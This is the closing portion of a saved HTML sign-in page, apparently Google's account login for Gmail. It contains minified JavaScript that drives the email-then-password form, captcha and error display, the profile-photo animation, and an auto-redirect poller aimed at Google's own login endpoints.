PS_7.prototype.O=function(a){a.V.persisted&&(PS_ye(this,!1),PS_ye(this,!0))};PS_7.prototype.U=function(){var a=PS_Ae(this.a);a!=this.g&&PS_Be(this,a)};
var PS_6=function(a){return null!=a.h?a.h:a.f?PS_Ae(a.a):PS_Ce(a)||""},PS_Ae=function(a){a=a.location.href;var b=a.indexOf("#");return 0>b?"":a.substring(b+1)},PS_De=function(a,b,c){PS_6(a)!=b&&(a.f?(PS_ve(a,b,c),PS_xe()||PS_t&&!PS_re()&&PS_we(a,b,c,void 0),a.j&&a.v()):(PS_we(a,b,c),a.h=a.g=a.l.value=b,PS_B(a,new PS_te)))},PS_ve=function(a,b,c){a=a.a.location;var d=a.href.split("#")[0],e=-1!=a.href.indexOf("#");if(PS_5||e||b)d+="#"+b;d!=a.href&&(c?a.replace(d):a.href=d)},PS_we=function(a,b,c,d){if(a.K||
b!=PS_Ce(a))if(a.K=!1,b=encodeURIComponent(String(b)),PS_t){var e=PS_Gc(a.s);e.open("text/html",c?"replace":void 0);c=PS_nc(PS_mc("title",{},d||a.a.document.title),PS_mc("body",{},b));e.write(PS_I(c));e.close()}else if(PS_Ea(a.o,PS_dc,"this.iframeSrc_ must be set on calls to setIframeToken_"),e=PS_ec(a.o)+"#"+b,a=a.s.contentWindow)c?a.location.replace(e):a.location.href=e},PS_Ce=function(a){if(PS_t)return a=PS_Gc(a.s),a.body?decodeURIComponent(a.body.innerHTML.replace(/\+/g," ")):null;var b=a.s.contentWindow;
if(b){var c;try{c=decodeURIComponent(PS_Ae(b).replace(/\+/g," "))}catch(d){return a.i||(1!=a.i&&PS_Lb(a.b,1E4),a.i=!0),null}a.i&&(0!=a.i&&PS_Lb(a.b,150),a.i=!1);return c||null}return null};PS_7.prototype.v=function(){if(this.f){var a=PS_Ae(this.a);a!=this.g&&PS_Be(this,a)}if(!this.f||PS_5)if(a=PS_Ce(this)||"",null==this.h||a==this.h)this.h=null,a!=this.g&&PS_Be(this,a)};var PS_Be=function(a,b){a.g=a.l.value=b;a.f?(PS_5&&PS_we(a,b),PS_ve(a,b)):PS_we(a,b);PS_B(a,new PS_te(PS_6(a)))};
PS_7.prototype.X=function(){PS_Jb(this.b);PS_Kb(this.b)};var PS_ze=["mousedown","keydown","mousemove"],PS_ue=0;var PS_Ee=function(a,b){PS_l.call(this);this.b=a;this.c=null;this.a=new PS_7;PS_m(this,this.a);PS_ye(this.a,!0);PS_De(this.a,a,!0);this.g=b||PS_ba;var c=new PS_R(this);PS_m(this,c);PS_S(c,this.a,"navigate",this.f)};PS_k(PS_Ee,PS_l);var PS_Fe={Wa:"identifier",Xa:"password"},PS_8=function(a){return"identifier"==a.b};PS_Ee.prototype.f=function(a){var b=PS_6(this.a),c;a:{for(c in PS_Fe)if(PS_Fe[c]==b){c=!0;break a}c=!1}c&&b!=this.b?(this.c=this.b,this.b=b,this.g(a)):PS_De(this.a,this.b,!1)};var PS_Ge=function(a){PS_l.call(this);this.l=a;this.i=PS_O("Email");this.o=PS_O("Passwd");this.a=PS_O("Email-hidden");this.f=this.a.value;this.b=PS_O("Passwd-hidden");this.g=PS_O("identifier-shown");this.u=PS_Ca(PS_Ec(this.g),"No children found under the element with id: identifier-shown");this.h=PS_O("password-shown");this.v=PS_Ca(PS_Ec(this.h),"No children found under the element with id: password-shown");this.j="";this.c=new PS_R(this);PS_m(this,this.c);PS_Cc(PS_8(this.l)?this.h:this.g);PS_xc(this.a,
{name:"Email"});PS_S(this.c,this.i,"input",this.s);PS_S(this.c,this.a,"change",this.I)};PS_k(PS_Ge,PS_l);PS_Ge.prototype.s=function(){this.b.value&&(PS_Pc(this.c,this.i,"input",this.s),this.j=this.b.value)};PS_Ge.prototype.I=function(){this.a.value=this.f};var PS_9=function(a,b){PS_l.call(this);this.c=new PS_Ee(1==a?"password":"identifier",PS_i(this.Pa,this));PS_m(this,this.c);this.Ha=PS_vc("main-content");this.j=PS_O("gaia_loginform");this.i=PS_vc("slide-out");this.g=PS_vc("slide-in");this.b=PS_O("Email");this.h=PS_O("Passwd");this.I=PS_O("next");this.ga=PS_O("signIn");this.o=PS_O("back-arrow");this.l=PS_vc("circle-mask");this.Qa=PS_O("email-display");this.qa=PS_O("profile-name");this.Ra=PS_O("link-forgot-passwd");this.R=null;this.w=PS_O("canvas");
this.X=PS_O("identifier-captcha");this.s=PS_O("captcha-img");this.fa=PS_O("identifier-token");this.K=PS_O("identifier-captcha-input");this.Oa=PS_O("profile-information");this.ra=PS_vc("signin-card");this.G=PS_vc("card-mask-wrap");this.u=PS_sc(document,"dasher-tooltip");this.J=new PS_Nb(this.Ga,75,this);PS_m(this,this.J);this.O=this.P=!1;this.v=0;this.f=new PS_R(this);PS_m(this,this.f);PS_S(this.f,this.j,"submit",this.Ja);PS_S(this.f,window,"resize",this.Na);PS_q(["transitionend","webkitTransitionEnd",
"otransitionend","mozTransitionEnd"],function(a){PS_S(this.f,this.i,a,this.Ka);PS_S(this.f,this.g,a,this.Ma)},this);PS_Sc(this.o,this.Ia,!1,this,this.f);this.j.action=b;this.a=null;this.ba=new PS_Ge(this.c);PS_m(this,this.ba);0==a?PS_He(this.b):(PS_He(this.h),PS_Rb(this.o,"shift-form"))};PS_k(PS_9,PS_l);var PS_Ie=["gaia","pages","PasswordSeparationPage"],PS_$=PS_b;PS_Ie[0]in PS_$||!PS_$.execScript||PS_$.execScript("var "+PS_Ie[0]);
for(var PS_Je;PS_Ie.length&&(PS_Je=PS_Ie.shift());)!PS_Ie.length&&PS_c(PS_9)?PS_$[PS_Je]=PS_9:PS_$[PS_Je]?PS_$=PS_$[PS_Je]:PS_$=PS_$[PS_Je]={};var PS_Ke={"-moz-transform":!0,"-ms-transform":!0,"-o-transform":!0,"-webkit-transform":!0,transform:!0};PS_9.prototype.Ja=function(a){PS_8(this.c)?(a.preventDefault(),PS_Q(this.I,!0),PS_Q(this.b,!0),PS_Le(this)):(PS_Q(this.ga,!0),PS_Q(this.I,!0),this.h.setAttribute("readonly",""))};
PS_9.prototype.Ia=function(a){a.preventDefault();PS_De(this.c.a,"identifier",!1)};
var PS_Le=function(a){if(!a.P){a.P=!0;var b={};b.Email=a.b.value;b.requestlocation=PS_b.location.href;a.O&&(b["identifier-captcha-input"]=a.K.value,b.identifiertoken=a.fa.value);var c="js_disabled";try{document.bg.invoke(function(a){c=a})}catch(f){c=""}b.bgresponse=c;PS_Me(a,b);var d=[],e;for(e in b)d.push(e+"="+encodeURIComponent(b[e]));PS_id(PS_i(a.La,a),d.join("&"))}},PS_Me=function(a,b){for(var c=PS_tc("INPUT","",a.j),d=0,e;e=c[d];d++)"hidden"==e.type&&e.value&&!b[e.name]&&(b[e.name]=e.value)},
PS_Oe=function(a,b){PS_Ne(a);a.ma=b.name;a.Ua=b.email;a.U=b.photo_url;a.Ea=b.recovery_url;if(b.shadow_email){a.ba.G=b.shadow_email;var c=document.createElement("INPUT");c.setAttribute("type","hidden");c.setAttribute("name","ignoreShadow");c.setAttribute("value","1");a.j.appendChild(c)}a.Oa.value=b.encoded_profile_information;PS_De(a.c.a,"password",!1)};
PS_9.prototype.La=function(a){this.P=!1;if(200==PS_qd(a.target)){var b;a=a.target;try{b=a.a?a.a.responseText:""}catch(c){PS_T(a.F,"Can not get responseText: "+c.message),b=""}b=PS_Tc(b);"SHOW_ERROR"==b.action?(PS_Pe(this),PS_Qe(this,b.error_msg)):"REDIRECT"==b.action?(a=b.redirectUrl,b=PS_b.location,a=a instanceof PS_G?a:PS_bc(a),b.href=PS_$b(a)):"SHOW_CAPTCHA"==b.action?(PS_Pe(this),PS_Re(this,b),PS_Se(this)):"SHOW_CAPTCHA_AND_ERROR"==b.action?(PS_Pe(this),PS_Re(this,b),PS_Qe(this,b.error_msg)):
(PS_Pe(this),PS_Oe(this,b))}else PS_Pe(this),PS_Oe(this,{name:"",email:this.b.value,photo_url:"",recovery_url:"https://accounts.google.com/RecoverAccount?Email="+this.b.value,encoded_profile_information:""})};var PS_Pe=function(a){PS_Q(a.I,!1);PS_Q(a.b,!1)};
PS_9.prototype.Pa=function(){PS_Ob(this.J);this.a&&this.a.la(!1);var a=this.ba;PS_8(a.l)?(PS_Cc(a.h),a.f=a.a.value="",a.o.value="",a.g.appendChild(a.u),a.j=a.b.value):(a.G?a.f=a.a.value=a.G:a.f=a.a.value=a.i.value,a.j!==a.b.value&&(a.o.value=a.b.value),PS_Cc(a.g),a.h.appendChild(a.v));if(PS_8(this.c)){if(PS_D(this.i,"hide-form",!1),PS_Te(this),PS_Ue(this,100,0),PS_Ve(this,"shift-form",!1),PS_Tb(this.o,"shift-form"),"password"==this.c.c&&(PS_Hd(this.l,"0.01"),a=this.J,PS_Ob(a),a.a=PS_Mb(a.f,PS_c(void 0)?
void 0:a.g),PS_Ne(this),PS_Se(this),PS_Q(this.ga,!1),PS_Q(this.I,!1),this.h.removeAttribute("readonly"),a=this.j.ignoreShadow))if(PS_ca(a))for(var b=a.length,c=0;c<b;c++)a[c].value="0";else a.value="0"}else this.u&&PS_0(this.u,!1),PS_D(this.g,"hide-form",!1),PS_Te(this),PS_Ue(this,0,100),PS_Ve(this,"shift-form",!0),PS_We(this)};
var PS_We=function(a){var b="https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=96";a.U&&(b=a.U+"?sz="+String(a.w.width));PS_Hb(new PS_Db(function(){this.R=document.createElement("IMG");this.R.src=b;this.w.getContext("2d").clearRect(0,0,this.w.width,this.w.height);this.ma?(PS_Hc(this.qa,this.ma),PS_0(this.qa,!0),PS_Ve(this,"no-name",!1)):(PS_0(this.qa,!1),PS_Ve(this,"no-name",!0));PS_Hc(this.Qa,this.Ua||"");this.Ea&&(this.Ra.href=this.Ea)},window,a))},
PS_Ve=function(a,b,c){PS_D(a.ra,b,c);PS_Xe(a,b,c)},PS_Xe=function(a,b,c){PS_D(a.G,b,c);PS_D(a.Ha,b,c)},PS_Ue=function(a,b,c){PS_Y(a.i,"transitionDelay",b+"ms");PS_Y(a.g,"transitionDelay",c+"ms")},PS_Te=function(a){a.ra.offsetWidth},PS_Qe=function(a,b){PS_He(a.b);var c=PS_O("errormsg_0_Email");if("INGE"==b){var d=PS_O("inge").cloneNode(!0),e=c.parentNode;e&&e.replaceChild(d,c);PS_xc(d,{id:"errormsg_0_Email"});PS_0(d,!0);PS_Ec(d).href+=PS_n(a.b.value)}else PS_Hc(c,b+" ");c=a.v;d=PS_O("errormsg_0_Email");
e=d.cloneNode(!0);PS_Tb(e,"error-msg");var f;a:{if(PS_qc&&!(PS_t&&PS_w("9")&&!PS_w("10")&&PS_b.SVGElement&&d instanceof PS_b.SVGElement)&&(f=d.parentElement))break a;f=d.parentNode;f=PS_h(f)&&1==f.nodeType?f:null}f.appendChild(e);f=PS_Fd(e).height;PS_Dc(e);d=PS_Kd(d,"margin");f+=d.top+d.bottom;a.v=f;d=a.G;b:{e=PS_wa("transform");if(void 0===d.style[e]&&(e=PS_rd()+PS_xa(e),void 0!==d.style[e])){e=PS_sd()+"-transform";break b}e="transform"}d=(d=PS__(d,e)||PS__(d,"transform"))?(d=d.match(PS_Nd))?new PS_K(parseFloat(d[1]),
parseFloat(d[2])):new PS_K(0,0):new PS_K(0,0);d=d.y+(a.v-c);0>d&&(c=a.G,PS_Qd()&&(d=PS_Rd()?"translate3d(0px,"+d+"px,0px)":"translate(0px,"+d+"px)",PS_Y(c,PS_Sd(),d)));PS_Ve(a,"has-error",!0);PS_Rb(a.b,"form-error")},PS_Se=function(a){a.v=0;PS_Y(a.G,"transform","");PS_Hc(PS_O("errormsg_0_Email"),"");PS_Dc(PS_sc(document,"errormsg_0_Passwd"));PS_Ve(a,"has-error",!1);PS_Tb(a.b,"form-error");PS_Tb(a.h,"form-error")};PS_9.prototype.Ga=function(){PS_Y(this.l,"background-image","");PS_Hd(this.l,"")};
PS_9.prototype.sa=function(){var a=this.w.width/2-this.R.width/2,b=this.w.height/2-this.R.height/2,c=this.w.getContext("2d"),d=0,e=this.w.width/2,f=this.w.height/2,g=document.createElement("canvas");g.width=this.w.width;g.height=this.w.height;var h=g.getContext("2d"),l=this.w.width/12,k=PS_i(function(){c.save();window.chrome?(h.clearRect(0,0,g.width,g.height),h.globalCompositeOperation="source-over",h.drawImage(this.R,a,b),h.shadowColor="#fff",h.globalCompositeOperation="destination-in",h.beginPath(),
h.arc(e,f,d,0,2*Math.PI,!1),h.closePath(),h.fill(),c.drawImage(g,0,0)):c.drawImage(this.R,a,b);c.restore()},this),m=PS_i(function(){var a=new PS_Db(m);d+=l;if(d<=this.w.width){var b=d;c.save();window.chrome||(c.beginPath(),c.arc(e,f,b,0,2*Math.PI,!1),c.clip());k();c.restore();PS_Hb(a)}else if(PS_Eb(a),!PS_8(this.c)&&(PS_Y(this.l,"background-image","none"),this.ma&&this.U))if(this.a)this.a.la(!0);else if((a=PS_uc("profile-tooltip"))&&this.w){this.a=new PS_pe;PS_m(this,this.a);b=this.a;b.h.a=this.w;
b.b.N&&b.b.b();b=this.a;PS_o(!b.M,"Must call setShowClosebox() before rendering");b.l=!1;b=this.a;PS_o(!b.M,"Must call setPosition() before rendering");b=b.h;PS_g(void 0)&&(b.h=Math.max(void 0,15));PS_g(-15)&&(b.g=-15);b=this.a;a=a.innerHTML;PS_o(PS_f(a)||a.nodeType||a instanceof PS_4||a instanceof PS_H,"Content must be a string or HTML.");b.s=a;PS_qe(b,a);a=this.a;if(a.M)throw Error("Component already rendered");a.a||a.ya();a.f.a.body.appendChild(a.a);a.g&&!a.g.M||a.ja();this.a.la(!0)}},this);m()};
var PS_Re=function(a,b){PS_Xe(a,"has-captcha",!0);a.O=!0;var c=PS_tc("IMG","",a.s)[0];c?c.src=b.img_url:(c=document.createElement("IMG"),c.setAttribute("src",b.img_url),c.setAttribute("alt",PS_0b(a.s)),a.s.appendChild(c));a.fa.setAttribute("value",PS_n(b.img_token));a.K.value="";PS_0(a.X,!0)},PS_Ne=function(a){PS_Xe(a,"has-captcha",!1);PS_Dc(PS_uc("captcha-container",a.g));a.O=!1;PS_Cc(a.s);a.K.value="";PS_0(a.X,!1)},PS_He=function(a){!a||"function"!=typeof a.focus||PS_Ya()||PS_("iPad")||PS_("iPod")||
PS_("Trident")||PS_("MSIE")||a.focus()};PS_9.prototype.Na=function(){if(this.a){var a=this.a;a.b.N&&a.b.b()}};PS_9.prototype.Ka=function(a){a.target==this.i&&PS_Ke[a.V.propertyName]&&(PS_8(this.c)?(this.u&&PS_0(this.u,!0),PS_He(this.b)):(PS_Se(this),PS_Rb(this.o,"shift-form"),PS_D(this.i,"hide-form",!0),PS_Te(this),PS_Te(this)))};
PS_9.prototype.Ma=function(a){a.target==this.g&&PS_Ke[a.V.propertyName]&&(PS_8(this.c)?(PS_D(this.g,"hide-form",!0),PS_Te(this)):(this.R.complete?this.sa.call(this):PS_Oc(this.f,this.R,"load",this.sa,void 0),PS_He(this.h)))};
</script>
  <script>
  passwordSeparationPage = new gaia.pages.PasswordSeparationPage(
  0
  , '');
  </script><input name="history_state0" id="history_state0" style="display:none" type="text">
<script>
  (function(){
  gaia_onLoginSubmit = function() {
  try {
  gaia.loginAutoRedirect.stop();
  } catch (err) {
  // do not prevent form from being submitted
  }
  try {
  document.bg.invoke(function(response) {
  document.getElementById('bgresponse').value = response;
  });
  } catch (err) {
  document.getElementById('bgresponse').value = '';
  }
  return true;
  }
  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
  var signinButton;
  signinButton = document.getElementById('next');
  gaia_attachEvent(window, 'load', function(){
  gaia_scrollToElement(signinButton);
  });
  })();
</script>
  <script>var f=this,g=function(a,c){var b=a.split("."),d=f;b[0]in d||!d.execScript||d.execScript("var "+b[0]);for(var e;b.length&&(e=b.shift());)b.length||void 0===c?d[e]?d=d[e]:d=d[e]={}:d[e]=c};var h=function(){try{return new XMLHttpRequest}catch(b){for(var a=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],c=0;c<a.length;c++)try{return new ActiveXObject(a[c])}catch(d){}}return null};g("gaia.ajax.newXmlHttpRequest",h);var k=function(){this.a=h();this.parameters={}};g("gaia.ajax.XmlHttpFormRequest",k);
k.prototype.send=function(a,c){var b=[],d;for(d in this.parameters)b.push(d+"="+encodeURIComponent(this.parameters[d]));var b=b.join("&"),e=this.a;e.open("POST",a,!0);e.setRequestHeader("Content-type","application/x-www-form-urlencoded");e.onreadystatechange=function(){4==e.readyState&&c({status:e.status,text:e.responseText})};e.send(b)};k.prototype.send=k.prototype.send;
k.prototype.c=function(a,c,b){var d=this.a;d.open("POST",a,!0);d.setRequestHeader("Content-type","application/json");d.onreadystatechange=function(){4==d.readyState&&b({status:d.status,text:d.responseText})};d.send(c)};k.prototype.sendJson=k.prototype.c;k.prototype.b=function(a,c){var b=this.a;b.open("GET",a,!0);b.onreadystatechange=function(){4==b.readyState&&c({status:b.status,text:b.responseText})};b.send()};k.prototype.get=k.prototype.b;var l=/\s*;\s*/,m=function(){if(!document.cookie)return"";for(var a=document.cookie.split(l),c=0;c<a.length;c++){var b=a[c],b=b.replace(/^\s+/,""),b=b.replace(/\s+$/,"");if(0==b.indexOf("APISID="))return b.substr(7)}return""};var n=null,p=function(a,c){this.g=a;this.f=c;this.c=m();this.b=!1},q=function(){var a=n,c=m();c==a.c||a.b||(a.c=c,(new k).b(a.f,function(b){var a=n;b&&b.status&&200==b.status&&"OK"==b.text&&(a.a&&clearInterval(a.a),a.b||(window.location=a.g))}))},r=function(a){var c=n;if(c.a)return!1;c.a=setInterval(function(){q()},a);return!0};g("gaia.loginAutoRedirect.start",function(a,c,b){if(n||!b||!c||0>=a)return!1;n=new p(c,b);return r(a)});
g("gaia.loginAutoRedirect.stop",function(){var a=n;a.b=!0;a.a&&(clearInterval(a.a),a.a=null)});
</script>
  <script type="text/javascript">
  gaia.loginAutoRedirect.start(5000,
  'https:\x2F\x2Faccounts.google.com\x2FServiceLogin?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F\x26osid=1\x26service=mail\x26ss=1\x26ltmpl=default\x26rm=false\x26passive=true\x26noautologin=true',
  'https:\x2F\x2Faccounts.google.com\x2FPassiveLoginProber?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F\x26osid=1\x26service=mail\x26ss=1\x26ltmpl=default\x26rm=false\x26passive=true');
  </script>
</body></html>